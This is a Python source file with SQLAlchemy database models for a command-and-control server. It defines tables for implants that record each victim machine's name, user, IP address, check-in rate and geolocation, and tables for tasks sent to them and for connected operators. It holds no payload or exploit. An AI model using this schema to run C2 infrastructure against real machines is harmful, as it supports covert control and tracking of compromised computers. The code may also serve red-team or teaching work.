from cvnt.database import db
from dataclasses import dataclass
from sqlalchemy import func

@dataclass
class Implant(db.Model):
    id = db.Column(db.Integer, primary_key = True)
    implant_id = db.Column(db.String)
    computer_name = db.Column(db.String)
    username = db.Column(db.String)
    ip_addr = db.Column(db.String)
    checkin_frq = db.Column(db.Integer)
    # Session Key: After you negotiated a session key, store it per agent
    # session_key = db.Column(db.String)
    first_seen = db.Column(db.DateTime)
    last_seen = db.Column(db.DateTime)
    latitude = db.Column(db.String)
    longitude = db.Column(db.String)

# Tasks Table: Keep track of jobs sent to implants that are in progress/finished
@dataclass 
class Task(db.Model):
    id = db.Column(db.Integer, primary_key = True)
    implant_id: str =  db.Column(db.String)
    task_id: int = db.Column(db.Integer)
    status: str = db.Column(db.String)
    task_opcode:str  = db.Column(db.String)
    task_args:str  = db.Column(db.String)
    task_output:str = db.Column(db.String)

# Clients Table: Keep track of operators connected to the C2 via the client
@dataclass
class Client(db.Model):
    id = db.Column(db.Integer, primary_key = True)
    client_id: str = db.Column(db.String)


